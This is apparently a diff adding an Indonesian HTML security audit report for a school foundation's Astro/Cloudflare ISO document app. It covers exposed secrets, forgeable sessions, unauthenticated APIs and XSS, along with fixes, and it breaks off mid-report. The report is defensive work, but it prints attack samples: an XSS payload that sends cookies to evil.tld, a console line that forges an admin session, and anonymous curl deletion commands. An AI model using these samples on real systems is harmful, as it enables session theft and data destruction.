@@ -1,0 +1,621 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Laporan Audit Keamanan — ISO Digital System (astro-app)</title>
+<style>
+  :root{
+    --bg:#f6f8fb; --card:#ffffff; --ink:#0f172a; --muted:#64748b; --line:#e2e8f0;
+    --crit:#b91c1c; --crit-bg:#fef2f2; --high:#c2410c; --high-bg:#fff7ed;
+    --med:#a16207; --med-bg:#fefce8; --low:#0369a1; --low-bg:#f0f9ff;
+    --ok:#15803d; --ok-bg:#f0fdf4;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font-family:"Plus Jakarta Sans",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    line-height:1.65;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:980px;margin:0 auto;padding:48px 24px 96px}
+  header{border-bottom:3px solid var(--ink);padding-bottom:24px;margin-bottom:40px}
+  .eyebrow{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);font-weight:700}
+  h1{font-size:34px;line-height:1.2;margin:10px 0 8px;letter-spacing:-.02em}
+  .sub{color:var(--muted);font-size:15px;margin:0}
+  .meta{display:flex;flex-wrap:wrap;gap:10px;margin-top:20px}
+  .chip{background:#eef2f7;border:1px solid var(--line);border-radius:999px;padding:5px 13px;font-size:12px;font-weight:600;color:#334155}
+  h2{font-size:22px;margin:52px 0 6px;letter-spacing:-.01em;padding-bottom:8px;border-bottom:1px solid var(--line)}
+  h3{font-size:16px;margin:28px 0 10px}
+  p{margin:10px 0}
+  .summary{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;margin:28px 0 8px}
+  .stat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px;text-align:center}
+  .stat .n{font-size:30px;font-weight:800;line-height:1}
+  .stat .l{font-size:11px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;margin-top:7px}
+  .finding{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px 24px;margin:18px 0;box-shadow:0 1px 2px rgba(15,23,42,.04)}
+  .finding.crit{border-left:5px solid var(--crit)}
+  .finding.high{border-left:5px solid var(--high)}
+  .finding.med{border-left:5px solid var(--med)}
+  .finding.low{border-left:5px solid var(--low)}
+  .fhead{display:flex;align-items:flex-start;justify-content:space-between;gap:14px;flex-wrap:wrap}
+  .ftitle{font-size:16.5px;font-weight:700;margin:0}
+  .fid{font-size:12px;color:var(--muted);font-family:ui-monospace,Menlo,monospace;margin-top:3px}
+  .badge{font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.07em;padding:4px 11px;border-radius:6px;white-space:nowrap}
+  .b-crit{background:var(--crit-bg);color:var(--crit);border:1px solid #fecaca}
+  .b-high{background:var(--high-bg);color:var(--high);border:1px solid #fed7aa}
+  .b-med{background:var(--med-bg);color:var(--med);border:1px solid #fde68a}
+  .b-low{background:var(--low-bg);color:var(--low);border:1px solid #bae6fd}
+  .lbl{font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin:16px 0 5px}
+  code{background:#f1f5f9;border:1px solid var(--line);border-radius:5px;padding:1.5px 6px;font-size:12.5px;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:#0f172a}
+  pre{background:#0f172a;color:#e2e8f0;border-radius:11px;padding:16px 18px;overflow-x:auto;font-size:12.5px;line-height:1.6;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;margin:8px 0 0}
+  pre code{background:none;border:none;color:inherit;padding:0;font-size:12.5px}
+  .com{color:#7dd3fc}.str{color:#fca5a5}.kw{color:#c4b5fd}.fn{color:#86efac}
+  ul{margin:8px 0;padding-left:22px}li{margin:5px 0}
+  .file{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;background:#f8fafc;border:1px solid var(--line);
+    border-radius:6px;padding:2px 7px;color:#334155}
+  table{width:100%;border-collapse:collapse;margin:18px 0;font-size:14px;background:var(--card);
+    border:1px solid var(--line);border-radius:12px;overflow:hidden}
+  th{background:#f1f5f9;text-align:left;padding:11px 14px;font-size:11px;text-transform:uppercase;
+    letter-spacing:.07em;color:#475569;font-weight:800;border-bottom:1px solid var(--line)}
+  td{padding:11px 14px;border-bottom:1px solid #f1f5f9;vertical-align:top}
+  tr:last-child td{border-bottom:none}
+  .phase{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px;margin:18px 0}
+  .phase h3{margin-top:0;display:flex;align-items:center;gap:10px}
+  .pnum{background:var(--ink);color:#fff;width:26px;height:26px;border-radius:50%;display:inline-flex;
+    align-items:center;justify-content:center;font-size:13px;font-weight:800;flex-shrink:0}
+  .ok-box{background:var(--ok-bg);border:1px solid #bbf7d0;border-radius:12px;padding:16px 20px;margin:16px 0;font-size:14px}
+  .warn-box{background:var(--crit-bg);border:1px solid #fecaca;border-radius:12px;padding:16px 20px;margin:16px 0;font-size:14px}
+  footer{margin-top:60px;padding-top:22px;border-top:1px solid var(--line);color:var(--muted);font-size:13px}
+  .toc{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px 24px;margin:24px 0}
+  .toc ol{margin:6px 0;padding-left:20px;font-size:14px}.toc li{margin:4px 0}
+  .toc a{color:#1d4ed8;text-decoration:none}.toc a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="eyebrow">Audit Keamanan Aplikasi</div>
+  <h1>ISO Digital System — Yayasan Sinar Putih Edelweiss</h1>
+  <p class="sub">Penilaian keamanan data &amp; dokumen: autentikasi, otorisasi, integritas dokumen, dan penanganan data pribadi.</p>
+  <div class="meta">
+    <span class="chip">Tanggal: 31 Agustus 2026</span>
+    <span class="chip">Target: D:\astro-app</span>
+    <span class="chip">Stack: Astro 4 + Solid.js + Cloudflare D1</span>
+    <span class="chip">Ruang lingkup: 3 halaman, 18 endpoint API, 17 komponen</span>
+  </div>
+</header>
+
+<div class="ok-box">
+  <strong>✓ Pembaruan 31 Agustus 2026 — seluruh temuan kritis sudah diperbaiki di kode.</strong>
+  <p style="margin:10px 0 0">Ketiga temuan kritis (C-01, C-02, C-03) beserta sejumlah temuan tinggi dan sedang telah ditangani, diuji, dan lolos build. Berikut ringkasannya:</p>
+  <table style="margin-top:14px">
+    <tr><th>Temuan</th><th>Status</th><th>Catatan</th></tr>
+    <tr><td>C-01 Secret terekspos</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai (kode)</span></td><td>Secret tidak lagi terbaca dari <code>import.meta.env</code>, <code>.env</code> dihapus, <code>.gitignore</code> dibuat. <strong>Rotasi di Azure Portal masih harus Anda lakukan.</strong></td></tr>
+    <tr><td>C-02 Sesi dapat dipalsukan</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td>Sesi ditandatangani HS256 (<code>jose</code>), cookie <code>httpOnly</code> + <code>secure</code>, masa berlaku 8 jam, peran diambil dari basis data.</td></tr>
+    <tr><td>C-03 API tanpa autentikasi</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td><code>src/middleware.ts</code> memverifikasi sesi di semua <code>/api/*</code>; terbukti menolak akses anonim pada seluruh endpoint.</td></tr>
+    <tr><td>H-02 Stored XSS</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td>Tanda tangan divalidasi sebagai data URL gambar, di-escape sebelum disisipkan ke HTML, dan iframe kini disandbox tanpa hak eksekusi skrip.</td></tr>
+    <tr><td>H-03 Endpoint <code>/api/seed</code></td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td>Berkas rute dihapus.</td></tr>
+    <tr><td>H-04 Login CSRF (<code>state</code>)</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td><code>crypto.randomUUID()</code> disimpan di cookie HttpOnly dan divalidasi saat callback.</td></tr>
+    <tr><td>H-05 Kebocoran ke log</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td><code>console.log</code> debug dihapus; galat tidak lagi mengembalikan <code>err.message</code>.</td></tr>
+    <tr><td>M-03 Header keamanan</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Sebagian</span></td><td>Lima header dasar dipasang via middleware. CSP penuh masih perlu ditambahkan.</td></tr>
+    <tr><td>M-04 Tanda tangan di localStorage</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td>Diganti endpoint <code>/api/user/signature</code> yang terautentikasi.</td></tr>
+    <tr><td>M-07 Peran tidak tersinkronisasi</td><td><span class="badge b-low" style="background:var(--ok-bg);color:var(--ok);border-color:#bbf7d0">Selesai</span></td><td>Callback melakukan upsert pengguna dan mengambil peran dari tabel <code>users</code>.</td></tr>
+  </table>
+</div>
+
+<div class="warn-box" style="margin-top:22px">
+  <strong>⚠ Satu tindakan tersisa yang harus Anda lakukan sendiri.</strong> Client secret Azure yang lama sudah terlanjur terekspos di dalam bundel yang pernah di-deploy, jadi memperbaiki kode saja belum cukup. Buka <em>Azure Portal → App Registration → Certificates &amp; secrets</em>, buat secret baru, hapus yang lama, lalu setel ulang nilainya sebagai secret Cloudflare Pages dan deploy ulang.
+</div>
+
+<h2 id="deploy">Langkah Deploy yang Diperlukan</h2>
+<p>Perubahan kode sudah selesai, tetapi aplikasi baru benar-benar aman setelah Anda menjalankan langkah-langkah berikut.</p>
+<pre><code><span class="com"># 1. Rotasi secret Azure di Portal, lalu setel kedua secret di Cloudflare Pages</span>
+npx wrangler pages secret put MS_CLIENT_SECRET
+npx wrangler pages secret put SESSION_SECRET   <span class="com"># nilai ada di .dev.vars</span>
+
+<span class="com"># 2. Build bersih dan deploy</span>
+npm run build:cloudflare
+npx wrangler pages deploy dist</code></pre>
+<div class="ok-box">
+  <strong>Temuan tak terduga saat perbaikan.</strong> Folder <code>dist/</code> ternyata berisi sisa build lama: ditemukan tiga berkas manifest berbeda, salah satunya dibuat di mesin Linux (<code>/var/www/html/iso-digital/astro-app/</code>) dan masih menyertakan rute <code>/api/seed</code>. Karena Cloudflare mengunggah seluruh isi <code>dist/</code>, artefak usang itu ikut ter-deploy. Astro tidak mengosongkan direktori output secara andal, sehingga skrip <code>clean</code> kini ditambahkan dan dijalankan otomatis sebelum setiap build.
+</div>
+<p>Selain itu, skrip <code>build:cloudflare</code> sebelumnya menggunakan sintaks <code>DEPLOY_TARGET=cloudflare astro build</code> yang <strong>gagal total di Windows</strong> karena npm menjalankan skrip lewat <code>cmd.exe</code>. Skrip itu dipindah ke berkas konfigurasi terpisah (<code>astro.config.cloudflare.mjs</code>) sehingga build produksi bisa dijalankan.</p>
+
+<h2>Ringkasan Eksekutif</h2>
+<p>Aplikasi ini secara fungsional sudah matang — alur PR, cuti, serah terima aset, dan absensi rapat berjalan, dengan template dokumen ISO 21001:2018 yang rapi. Namun dari sisi keamanan, aplikasi ini masih berstatus <em>prototype</em>: <strong>tidak ada satu pun endpoint API yang melakukan autentikasi atau otorisasi</strong>, dan sesi login disimpan sebagai cookie JSON tanpa tanda tangan, sehingga peran <code>admin</code> dapat dipalsukan langsung dari browser.</p>
+<p>Akibatnya, sistem persetujuan berjenjang (approval) yang menjadi inti kepatuhan ISO 21001 saat ini <strong>tidak dapat dipertanggungjawabkan secara hukum</strong>: siapa pun dapat menyetujui dokumen, menyisipkan tanda tangan palsu, atau menghapus jejak persetujuan tanpa meninggalkan audit trail.</p>
+
+<div class="summary">
+  <div class="stat"><div class="n" style="color:var(--crit)">3</div><div class="l">Kritis</div></div>
+  <div class="stat"><div class="n" style="color:var(--high)">6</div><div class="l">Tinggi</div></div>
+  <div class="stat"><div class="n" style="color:var(--med)">7</div><div class="l">Sedang</div></div>
+  <div class="stat"><div class="n" style="color:var(--low)">4</div><div class="l">Rendah</div></div>
+  <div class="stat"><div class="n">13</div><div class="l">Kerentanan dependensi</div></div>
+</div>
+
+<div class="toc">
+  <strong>Daftar isi</strong>
+  <ol>
+    <li><a href="#kritis">Temuan Kritis</a></li>
+    <li><a href="#tinggi">Temuan Tingkat Tinggi</a></li>
+    <li><a href="#sedang">Temuan Tingkat Sedang</a></li>
+    <li><a href="#rendah">Temuan Tingkat Rendah</a></li>
+    <li><a href="#dependensi">Kerentanan Dependensi</a></li>
+    <li><a href="#rencana">Rencana Perbaikan Berprioritas</a></li>
+    <li><a href="#positif">Hal yang Sudah Baik</a></li>
+  </ol>
+</div>
+
+<!-- ============ KRITIS ============ -->
+<h2 id="kritis">1. Temuan Kritis</h2>
+
+<div class="finding crit">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Client secret Azure/Entra ID terekspos dan ikut ter-deploy ke produksi</p>
+      <div class="fid">C-01 · Secrets Management · CVSS ~9.1</div>
+    </div>
+    <span class="badge b-crit">Kritis</span>
+  </div>
+  <div class="lbl">Bukti</div>
+  <p>Berkas <span class="file">.env</span> berisi secret dalam teks biasa, <strong>tidak ada <code>.gitignore</code></strong> di proyek ini, dan Vite/Astro menyalin nilainya secara statis ke dalam hasil build:</p>
+  <pre><code><span class="com">// dist/_worker.js/pages/api/auth/callback.astro.mjs</span>
+<span class="kw">let</span> msSecret = <span class="str">"xQ88Q~VerjLtucW…[DISEMBUNYIKAN]…xkaZ-"</span>;</code></pre>
+  <p>Artinya secret ini <strong>sudah terunggah ke Cloudflare Pages</strong> di dalam bundle <code>_worker.js</code> yang dapat diakses publik, dan akan ikut ter-commit jika proyek ini dimasukkan ke Git.</p>
+  <div class="lbl">Dampak</div>
+  <p>Penyerang yang memiliki secret + client ID (keduanya ada di kode) dapat melakukan operasi atas nama aplikasi di tenant Microsoft 365 sekolah — berpotensi membaca data Graph, mengirim email, atau memperluas akses tergantung izin yang diberikan pada app registration.</p>
+  <div class="lbl">Tindakan</div>
+  <ul>
+    <li><strong>Rotate secret sekarang</strong> di Azure Portal → App Registration → Certificates &amp; secrets → buat secret baru, hapus yang lama.</li>
+    <li>Buat <code>.gitignore</code> berisi <code>.env</code>, <code>.env.*</code>, <code>node_modules/</code>, <code>dist/</code>, <code>.wrangler/</code>.</li>
+    <li>Simpan secret <em>hanya</em> sebagai Cloudflare Pages secret: <code>wrangler pages secret put MS_CLIENT_SECRET</code>.</li>
+    <li>Ubah kode agar <strong>tidak pernah</strong> membaca secret lewat <code>import.meta.env</code> (yang di-inline saat build) — cukup <code>locals.runtime.env</code>, dan build tanpa berkas <code>.env</code>.</li>
+    <li>Rebuild dan deploy ulang setelah rotasi.</li>
+  </ul>
+  <div class="lbl">Perbaikan</div>
+  <pre><code><span class="com">// callback.ts — jangan pernah fallback ke import.meta.env di production</span>
+<span class="kw">const</span> msSecret = (locals <span class="kw">as any</span>)?.runtime?.env?.MS_CLIENT_SECRET;
+<span class="kw">if</span> (!msSecret) <span class="kw">return</span> redirect(<span class="str">'/?auth_error=missing_ms_secret'</span>, <span class="fn">302</span>);</code></pre>
+</div>
+
+<div class="finding crit">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Sesi login dapat dipalsukan — siapa pun bisa menjadi admin</p>
+      <div class="fid">C-02 · Broken Authentication · CVSS ~9.8</div>
+    </div>
+    <span class="badge b-crit">Kritis</span>
+  </div>
+  <div class="lbl">Bukti</div>
+  <p><span class="file">src/pages/api/auth/callback.ts</span> menulis sesi sebagai JSON polos tanpa tanda tangan kriptografis:</p>
+  <pre><code>cookies.set(<span class="str">'iso_user_session'</span>, JSON.stringify(sessionPayload), {
+  path: <span class="str">'/'</span>,
+  httpOnly: <span class="kw">false</span>,        <span class="com">// ← dapat dibaca/ditulis JS</span>
+  secure: <span class="kw">false</span>,          <span class="com">// ← dikirim lewat HTTP juga</span>
+  sameSite: <span class="str">'lax'</span>,
+  maxAge: <span class="fn">60</span> * <span class="fn">60</span> * <span class="fn">24</span> * <span class="fn">7</span>,
+});</code></pre>
+  <p>Tidak ada HMAC, tidak ada penyimpanan sesi di server, tidak ada pencabutan. Server mempercayai isi cookie secara mentah (<code>JSON.parse</code> di <code>/api/auth/me</code> dan di halaman <code>/meeting/[id]</code>).</p>
+  <div class="lbl">Dampak</div>
+  <p>Satu baris di konsol browser cukup untuk mengambil alih identitas siapa pun:</p>
+  <pre><code>document.cookie = <span class="str">"iso_user_session="</span> + encodeURIComponent(JSON.stringify({
+  id: <span class="fn">1</span>, displayName: <span class="str">"Aris Setyawan"</span>, email: <span class="str">"aris.setyawan@edelweiss.sch.id"</span>,
+  jobTitle: <span class="str">"ICT Coordinator"</span>, department: <span class="str">"ICT"</span>, role: <span class="str">"admin"</span>
+})) + <span class="str">"; path=/"</span>;</code></pre>
+  <p>Karena cookie tidak <code>httpOnly</code>, skrip jahat mana pun di halaman (termasuk XSS pada temuan H-04) juga dapat mencurinya.</p>
+  <div class="lbl">Tindakan</div>
+  <ul>
+    <li>Ganti ke sesi bertanda tangan/terenkripsi. Untuk Cloudflare Workers, <code>jose</code> (JWT) atau <code>iron-webcrypto</code> adalah pilihan yang ringan dan kompatibel dengan Web Crypto.</li>
+    <li>Set <code>httpOnly: true</code>, <code>secure: true</code>, <code>sameSite: 'lax'</code>, dan simpan kunci di Pages secret (<code>SESSION_SECRET</code>).</li>
+    <li>Sertakan <code>iat</code> / <code>exp</code> dan verifikasi di setiap permintaan; sediakan endpoint logout yang benar-benar mencabut sesi.</li>
+    <li>Ambil <code>role</code> dari basis data berdasarkan <code>ms_id</code>, bukan dari klaim yang dikirim klien.</li>
+  </ul>
+  <div class="lbl">Perbaikan</div>
+  <pre><code><span class="com">// src/lib/session.ts</span>
+<span class="kw">import</span> { SignJWT, jwtVerify } <span class="kw">from</span> <span class="str">'jose'</span>;
+<span class="kw">const</span> key = () =&gt; <span class="kw">new</span> TextEncoder().encode(secret);
+
+<span class="kw">export async function</span> <span class="fn">sealSession</span>(payload: SessionUser) {
+  <span class="kw">return await new</span> SignJWT({ ...payload })
+    .setProtectedHeader({ alg: <span class="str">'HS256'</span> })
+    .setIssuedAt().setExpirationTime(<span class="str">'8h'</span>)
+    .sign(key());
+}
+<span class="kw">export async function</span> <span class="fn">openSession</span>(token?: string) {
+  <span class="kw">if</span> (!token) <span class="kw">return null</span>;
+  <span class="kw">try</span> { <span class="kw">const</span> { payload } = <span class="kw">await</span> jwtVerify(token, key());
+        <span class="kw">return</span> payload <span class="kw">as</span> SessionUser; }
+  <span class="kw">catch</span> { <span class="kw">return null</span>; }
+}</code></pre>
+</div>
+
+<div class="finding crit">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Seluruh API dapat diakses tanpa login (18 endpoint terbuka)</p>
+      <div class="fid">C-03 · Broken Access Control · CVSS ~8.6</div>
+    </div>
+    <span class="badge b-crit">Kritis</span>
+  </div>
+  <div class="lbl">Bukti</div>
+  <p>Tidak ada satu pun dari 18 berkas di <span class="file">src/pages/api/</span> yang memeriksa cookie sesi. Polanya identik di semua endpoint:</p>
+  <pre><code><span class="kw">export const</span> DELETE: APIRoute = <span class="kw">async</span> ({ params, locals }) =&gt; {
+  <span class="kw">const</span> env = locals.runtime?.env;              <span class="com">// cek DB saja…</span>
+  <span class="kw">await</span> db.delete(meetings).where(eq(meetings.id, meetingId));
+  <span class="kw">return new</span> Response(JSON.stringify({ success: <span class="kw">true</span> }), { status: <span class="fn">200</span> });
+};</code></pre>
+  <p>Contoh yang dapat dieksploitasi secara anonim:</p>
+  <pre><code>curl -X DELETE https://&lt;domain&gt;/api/meetings/MTG-42     <span class="com"># hapus rapat + daftar hadir</span>
+curl          https://&lt;domain&gt;/api/prs                 <span class="com"># semua PR + tanda tangan base64</span>
+curl          https://&lt;domain&gt;/api/meetings            <span class="com"># nama, email, TTD seluruh peserta</span>
+curl          https://&lt;domain&gt;/api/assets              <span class="com"># nilai aset & lokasi server room</span></code></pre>
+  <div class="lbl">Dampak</div>
+  <p>Kebocoran data pribadi massal (nama, email, jabatan, tanda tangan base64), penghancuran data oleh siapa pun, dan pemalsuan status persetujuan. Untuk aplikasi yang mengklaim kepatuhan ISO 21001:2018, ini merupakan pelanggaran langsung terhadap klausul kontrol dokumen dan rekaman.</p>
+  <div class="lbl">Tindakan</div>
+  <ul>
+    <li>Buat <code>src/middleware.ts</code> yang memverifikasi sesi untuk semua rute <code>/api/*</code> kecuali allowlist (<code>/api/auth/*</code>).</li>
+    <li>Tambahkan pemeriksaan otorisasi per-aksi: hanya pembuat yang boleh mengubah dokumennya; hanya pemegang peran pada langkah approval aktif yang boleh menyetujui.</li>
+    <li>Batasi cakupan data: endpoint daftar hanya mengembalikan dokumen milik pengguna, atau dokumen yang memang perlu ia setujui.</li>
+  </ul>
+  <div class="lbl">Perbaikan</div>
+  <pre><code><span class="com">// src/middleware.ts</span>
+<span class="kw">export async function</span> <span class="fn">onRequest</span>(ctx, next) {
+  <span class="kw">const</span> { pathname } = <span class="kw">new</span> URL(ctx.request.url);
+  <span class="kw">const</span> isApi = pathname.startsWith(<span class="str">'/api/'</span>);
+  <span class="kw">const</span> isPublic = pathname.startsWith(<span class="str">'/api/auth/'</span>);
+
+  <span class="kw">const</span> user = <span class="kw">await</span> openSession(ctx.cookies.get(<span class="str">'iso_user_session'</span>)?.value);
+  ctx.locals.user = user;
+
+  <span class="kw">if</span> (isApi &amp;&amp; !isPublic &amp;&amp; ctx.request.method !== <span class="str">'GET'</span> &amp;&amp; !user)
+    <span class="kw">return new</span> Response(<span class="str">'Unauthorized'</span>, { status: <span class="fn">401</span> });
+  <span class="kw">if</span> (isApi &amp;&amp; !isPublic &amp;&amp; !user)
+    <span class="kw">return new</span> Response(<span class="str">'Unauthorized'</span>, { status: <span class="fn">401</span> });
+  <span class="kw">return</span> next();
+}</code></pre>
+</div>
+
+<!-- ============ TINGGI ============ -->
+<h2 id="tinggi">2. Temuan Tingkat Tinggi</h2>
+
+<div class="finding high">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Alur persetujuan dapat dipalsukan dari sisi klien</p>
+      <div class="fid">H-01 · Integrity / Spoofing</div>
+    </div>
+    <span class="badge b-high">Tinggi</span>
+  </div>
+  <p>Pada <span class="file">src/pages/api/prs/[id].ts</span> (serta leaves dan handovers), status dan <strong>tanda tangan approver</strong> dikirim oleh klien lalu disimpan apa adanya. Tidak ada verifikasi bahwa pengguna yang menekan "Setuju" memang memiliki peran pada langkah tersebut, dan tidak ada pencocokan tanda tangan dengan pemilik akun.</p>
+  <pre><code><span class="kw">if</span> (body.approvals) {
+  <span class="kw">await</span> db.delete(prApprovals).where(eq(prApprovals.prId, prId));   <span class="com">// hapus jejak lama</span>
+  <span class="kw">await</span> db.insert(prApprovals).values(body.approvals.map(a =&gt; ({
+    status: a.status, signature: a.signature,   <span class="com">// ← dari klien, tanpa validasi</span>
+  })));
+}</code></pre>
+  <p><strong>Dampak:</strong> staf biasa dapat membuat PR Rp 50 juta, menandainya "Approved" di semua tingkat, lalu menyisipkan gambar tanda tangan Ketua Yayasan yang diambil dari dokumen lain. Dokumen yang dihasilkan akan tampak sah.</p>
+  <p><strong>Tindakan:</strong> lakukan transisi status di server. Verifikasi <code>ctx.locals.user.role</code> cocok dengan <code>prApprovals.role</code> pada <code>currentApprovalStep</code>; ambil tanda tangan dari tabel <code>users</code> berdasarkan ID sesi — jangan pernah menerima <code>signature</code> dari badan permintaan.</p>
+</div>
+
+<div class="finding high">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Stored XSS melalui data tanda tangan (iframe tanpa sandbox)</p>
+      <div class="fid">H-02 · CWE-79 Cross-Site Scripting</div>
+    </div>
+    <span class="badge b-high">Tinggi</span>
+  </div>
+  <p><span class="file">/api/user/save-signature</span> dan <span class="file">/api/meetings/[id]/attend</span> menerima string apa pun sebagai tanda tangan — tidak ada pemeriksaan bahwa nilainya berupa <code>data:image/png;base64,…</code>. Nilai itu kemudian disuntikkan mentah ke dalam HTML dokumen:</p>
+  <pre><code><span class="com">// src/lib/pdfTemplates.ts</span>
+<span class="kw">const</span> pemohonSig = pr.requester_signature
+  ? <span class="str">`&lt;img src="</span><span class="com">${pr.requester_signature}</span><span class="str">" alt="TTD"&gt;`</span> : <span class="str">''</span>;</code></pre>
+  <p>Dan HTML tersebut dirender di <span class="file">PdfPreviewModal.tsx</span> menggunakan <code>&lt;iframe srcdoc&gt;</code> <strong>tanpa atribut <code>sandbox</code></strong>. Iframe <code>srcdoc</code> mewarisi origin halaman induk, sehingga skrip di dalamnya memiliki akses penuh ke DOM dan cookie aplikasi.</p>
+  <pre><code><span class="com">// payload tanda tangan "beracun"</span>
+x<span class="str">" onerror="</span>fetch(<span class="str">'//evil.tld?c='</span>+document.cookie)</code></pre>
+  <p><strong>Dampak:</strong> pencurian sesi, aksi atas nama korban, dan penyebaran otomatis ke setiap pengguna yang membuka pratinjau dokumen.</p>
+  <p><strong>Tindakan:</strong></p>
+  <ul>
+    <li>Validasi di server: <code>/^data:image\/(png|jpeg);base64,[A-Za-z0-9+\/=]+$/</code> dan batasi ukuran (mis. &lt; 200 KB).</li>
+    <li>Escape semua nilai sebelum disisipkan ke HTML, atau gunakan pembuatan DOM yang aman.</li>
+    <li>Tambahkan <code>sandbox</code> pada iframe — cukup <code>sandbox=""</code> bila hanya menampilkan, atau aktifkan <code>allow-scripts</code> secara terpisah bila benar-benar diperlukan.</li>
+    <li>Tambahkan CSP: <code>img-src 'self' data: blob:</code>.</li>
+  </ul>
+  <pre><code><span class="kw">function</span> <span class="fn">escapeHtml</span>(s = <span class="str">''</span>) {
+  <span class="kw">return</span> s.replace(/[&amp;&lt;&gt;"']/g, c =&gt;
+    ({ <span class="str">'&amp;'</span>:<span class="str">'&amp;amp;'</span>, <span class="str">'&lt;'</span>:<span class="str">'&amp;lt;'</span>, <span class="str">'&gt;'</span>:<span class="str">'&amp;gt;'</span>,
+       <span class="str">'"'</span>:<span class="str">'&amp;quot;'</span>, <span class="str">"'"</span>:<span class="str">'&amp;#39;'</span> }[c]!));
+}
+<span class="kw">const</span> pemohonSig = isDataImage(pr.requester_signature)
+  ? <span class="str">`&lt;img src="</span><span class="com">${escapeHtml(pr.requester_signature)}</span><span class="str">" alt="TTD"&gt;`</span> : <span class="str">''</span>;</code></pre>
+</div>
+
+<div class="finding high">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Endpoint <code>/api/seed</code> terbuka untuk umum</p>
+      <div class="fid">H-03 · Exposure of Administrative Interface</div>
+    </div>
+    <span class="badge b-high">Tinggi</span>
+  </div>
+  <p><span class="file">src/pages/api/seed.ts</span> mengekspos operasi <code>GET</code> tanpa autentikasi apa pun. Untungnya <code>seed.ts</code> menggunakan <code>onConflictDoNothing()</code>, sehingga pemanggilan berulang tidak menghapus data — namun endpoint administratif tetap tidak boleh dapat dipanggil siapa pun, dan dapat dipakai untuk membebani basis data.</p>
+  <p><strong>Tindakan:</strong> hapus endpoint ini dari build produksi, atau lindungi dengan peran <code>admin</code> plus secret sekali pakai. Cara terbaik: jalankan seeding lewat perintah <code>wrangler d1 execute</code>, bukan lewat HTTP.</p>
+</div>
+
+<div class="finding high">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Parameter OAuth <code>state</code> tidak pernah divalidasi</p>
+      <div class="fid">H-04 · CWE-352 Login CSRF</div>
+    </div>
+    <span class="badge b-high">Tinggi</span>
+  </div>
+  <p><span class="file">ms-login.ts</span> membuat nilai <code>state</code> acak:</p>
+  <pre><code><span class="kw">const</span> state = Math.random().toString(<span class="fn">36</span>).substring(<span class="fn">2</span>, <span class="fn">15</span>);</code></pre>
+  <p>…tetapi nilai itu <strong>tidak disimpan</strong> (tidak di cookie, tidak di sesi) dan <span class="file">callback.ts</span> tidak pernah membandingkannya. Selain itu <code>Math.random()</code> tidak aman secara kriptografis.</p>
+  <p><strong>Dampak:</strong> login CSRF — penyerang dapat memaksa korban masuk ke akun penyerang (session fixation), yang berujung pada data korban tersimpan pada akun yang dikendalikan penyerang.</p>
+  <p><strong>Tindakan:</strong> bangkitkan <code>state</code> dengan <code>crypto.randomUUID()</code>, simpan di cookie <code>httpOnly</code> yang berumur pendek, dan verifikasi kecocokannya di callback sebelum menukar kode otorisasi.</p>
+</div>
+
+<div class="finding high">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Rahasia dan data teknis dicetak ke log server</p>
+      <div class="fid">H-05 · CWE-532 Information Disclosure</div>
+    </div>
+    <span class="badge b-high">Tinggi</span>
+  </div>
+  <pre><code><span class="com">// src/pages/api/auth/callback.ts</span>
+console.log(<span class="str">'DEBUG Secret:'</span>, { length: msSecret.length,
+              firstChar: msSecret[<span class="fn">0</span>], lastChar: msSecret[msSecret.length-<span class="fn">1</span>] });
+console.error(<span class="str">'Failed to get access token from Microsoft:'</span>, tokenData);</code></pre>
+  <p>Log ini tersimpan dan dapat dilihat di dashboard Cloudflare Pages (<code>wrangler pages deployment tail</code>), serta memberi petunjuk struktur secret kepada penyerang. Selain itu seluruh handler mengembalikan <code>err.message</code> mentah ke klien, yang dapat membocorkan skema basis data dan jalur berkas.</p>
+  <p><strong>Tindakan:</strong> hapus semua <code>console.log</code> debug. Kembalikan pesan generik ke klien (<code>"Terjadi kesalahan internal"</code>) dan catat detailnya hanya di log server.</p>
+</div>
+
+<div class="finding high">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Data pribadi dan aset bernilai terekspos tanpa autentikasi</p>
+      <div class="fid">H-06 · CWE-359 Exposure of Private Information</div>
+    </div>
